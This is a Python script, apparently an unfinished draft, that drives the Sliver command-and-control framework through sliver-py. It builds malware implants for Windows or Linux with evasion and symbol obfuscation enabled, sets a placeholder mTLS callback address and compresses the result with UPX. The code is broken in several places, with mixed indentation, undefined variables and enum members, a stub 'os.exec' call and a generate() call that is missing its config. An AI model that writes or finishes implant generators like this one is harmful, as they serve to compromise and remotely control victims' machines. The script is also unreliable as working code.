#!/usr/bin/env python3

#python3 -m pip install sliver-py
# https://sliverpy.readthedocs.io/en/latest/install.html

# new-operator --name zer0cool --lhost localhost --save ./zer0cool.cfg

# ./sliver-server operator --name zer0cool --lhost localhost --save ./zer0cool.cfg

# ./sliver-server daemon

import os
import asyncio
import argparse
from enum import Enum
from sliver import SliverClientConfig, AsyncSliverClient, client_pb2

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
CONFIG_PATH = os.path.join(CONFIG_DIR, "default.cfg")


class OS(Enum):
	windows = 1
	linux = 2
	osx = 3

class Format(Enum):
	windows = 1
	linux = 2
	osx = 3


async def main(args):

    ''' Client connect example '''
    config = SliverClientConfig.parse_config_file(CONFIG_PATH)
    client = AsyncSliverClient(config)
    await client.connect()

	name = "testimplant"
	evasion = True
	ObfuscateSymbols = True

	if (os == OS.windows):
		os_pb = "windows"
		if (format_type == Format.DLL):
			format_pb = client_pb2.OutputFormat.SHARED_LIB
		elif (format_type == Format.EXE):
			format_pb = client_pb2.OutputFormat.EXECUTABLE
		else:
			error("unsupported format")
	elif (os == OS.linux):
		os_pb = "linux"
		if (format_type == Format.SO):
			format_pb = client_pb2.OutputFormat.SHARED_LIB
		elif (format_type == Format.ELF):
			format_pb = client_pb2.OutputFormat.EXECUTABLE
		else:
			error("unsupported format")
	else:
		error("unsupported OS")


	output_filename=args.output

	ImplantC2 = client_pb2.ImplantC2(URL="mtls://IP:port")

	config = client_pb2.ImplantConfig(name=name, evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, format=format_pb, GOOS=os_pb)
	await client.generate()
	print("implant generated")
	print(f"saved to {output_filename}")

	if args.upx == True:
		print("compressing")
		try:
			os.exec
		except Exception as e:
			raise e



if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument('-f', '--format', choices=["exe", "elf", "dll", "so"], help='format to generate')
	parser.add_argument('-o', '--output', help='file to write to')


	parser.add_argument('-m', '--method', choices=["mtls", "https", "dll", "so"], help='C2 method')

	parser.add_argument('-l', '--lhost', help='C2 ip / hostname')
	parser.add_argument('-p', '--port', help='C2 port')

	parser.add_argument('-u', '--upx', action='store_true', default=True, help='UPX compress')

	args = parser.parse_args()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(args))




# https://sliverpy.readthedocs.io/en/latest/protobuf/client_pb2.html#sliver.pb.clientpb.client_pb2.ImplantConfig